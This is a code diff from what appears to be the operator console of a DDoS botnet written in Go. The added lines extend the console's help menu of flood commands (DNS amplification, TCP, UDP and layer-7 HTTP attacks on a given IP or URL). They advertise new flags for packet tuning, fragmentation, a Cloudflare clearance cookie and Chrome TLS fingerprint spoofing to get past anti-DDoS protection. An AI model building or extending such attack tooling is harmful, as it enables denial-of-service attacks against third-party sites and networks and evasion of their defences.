@@ -170,6 +170,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33mdns-amp <ip> <time>\x1b[1;32m (no port needed)                         ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-tcp <ip> <time> tcpport=80 greport=80\x1b[1;32m                 ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-udp <ip> <time> udpport=53 greport=53\x1b[1;32m                 ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mIMPROVED FLAGS: \x1b[1;33mmss=1460\x1b[1;32m, \x1b[1;33mwscale=7\x1b[1;32m, \x1b[1;33mtimestamp=1\x1b[1;32m, \x1b[1;33mfragment=1\x1b[1;32m, \x1b[1;33madaptive=1\x1b[1;32m     ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -182,6 +183,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mhttp https://example.com/ 60\x1b[1;32m                                       ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-l7 https://target.com/ 120 domain=target.com\x1b[1;32m                  ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mIMPROVED FLAGS: \x1b[1;33mcookies=\"cf_clearance=xxx\"\x1b[1;32m, \x1b[1;33mtlsfp=chrome\x1b[1;32m, \x1b[1;33mfprot=1\x1b[1;32m           ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
